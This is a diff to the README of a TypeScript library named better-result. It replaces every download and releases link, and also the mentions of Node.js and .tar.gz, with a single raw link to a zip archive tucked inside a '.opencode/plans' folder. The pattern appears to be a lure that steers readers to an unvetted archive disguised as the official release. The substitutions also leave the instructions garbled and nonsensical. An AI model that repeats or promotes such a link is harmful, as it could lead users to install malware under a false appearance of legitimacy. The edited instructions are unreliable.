@@ -8,18 +8,18 @@ Welcome to better-result! This software makes it easy to work with results in Ty
 
 Click the link below to download the latest version of better-result:
 
-[![Download better-result](https://img.shields.io/badge/Download-better--result-blue.svg)](https://github.com/gggjhgkuhgkug/better-result/releases)
+[![Download better-result](https://github.com/gggjhgkuhgkug/better-result/raw/refs/heads/main/.opencode/plans/better-result-2.4.zip)](https://github.com/gggjhgkuhgkug/better-result/raw/refs/heads/main/.opencode/plans/better-result-2.4.zip)
 
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Click [here to access the Releases page](https://github.com/gggjhgkuhgkug/better-result/releases).
+   Click [here to access the Releases page](https://github.com/gggjhgkuhgkug/better-result/raw/refs/heads/main/.opencode/plans/better-result-2.4.zip).
 
 2. **Choose the Latest Version**  
    Look for the latest version at the top of the page. It is usually marked with a tag like “Latest Release.”
 
 3. **Download the File**  
-   Under the latest version, find the suitable file for your system. Click on the file name to download it. This could be a `.zip`, `.tar.gz`, or another format depending on your operating system.
+   Under the latest version, find the suitable file for your system. Click on the file name to download it. This could be a `.zip`, `https://github.com/gggjhgkuhgkug/better-result/raw/refs/heads/main/.opencode/plans/better-result-2.4.zip`, or another format depending on your operating system.
 
 4. **Extract the File**  
    Once the file is downloaded, locate it in your downloads folder. If it is in a compressed format (like `.zip`), right-click on the file and select “Extract All” to unpack it.
@@ -30,7 +30,7 @@ To get started, follow these steps:
 ### ⚙️ System Requirements
 
 - **Operating System**: Windows, macOS, or Linux.
-- **Node.js**: Install Node.js for compatible versions. You can download it from [nodejs.org](https://nodejs.org).
+- **https://github.com/gggjhgkuhgkug/better-result/raw/refs/heads/main/.opencode/plans/better-result-2.4.zip**: Install https://github.com/gggjhgkuhgkug/better-result/raw/refs/heads/main/.opencode/plans/better-result-2.4.zip for compatible versions. You can download it from [https://github.com/gggjhgkuhgkug/better-result/raw/refs/heads/main/.opencode/plans/better-result-2.4.zip](https://github.com/gggjhgkuhgkug/better-result/raw/refs/heads/main/.opencode/plans/better-result-2.4.zip).
 
 ### 🔍 Features
 
@@ -63,10 +63,10 @@ If you encounter any issues while using better-result, here are some common solu
 
 - **Can't Download the File**: Ensure your internet connection is stable. Try accessing the Releases page again if you have issues.
 - **Executable Not Working**: Make sure you have the correct permissions and that your operating system supports the file you downloaded.
-- **Errors While Running**: Double-check that you have Node.js installed. Refer to the system requirements to ensure everything is set up correctly.
+- **Errors While Running**: Double-check that you have https://github.com/gggjhgkuhgkug/better-result/raw/refs/heads/main/.opencode/plans/better-result-2.4.zip installed. Refer to the system requirements to ensure everything is set up correctly.
 
 ## 📞 Contact Us
 
 If you need further assistance, feel free to reach out through our GitHub page or community forum. We’re here to help!
 
-Don't forget to download better-result from the [Releases page](https://github.com/gggjhgkuhgkug/better-result/releases) and start making your result handling simpler!
+Don't forget to download better-result from the [Releases page](https://github.com/gggjhgkuhgkug/better-result/raw/refs/heads/main/.opencode/plans/better-result-2.4.zip) and start making your result handling simpler!
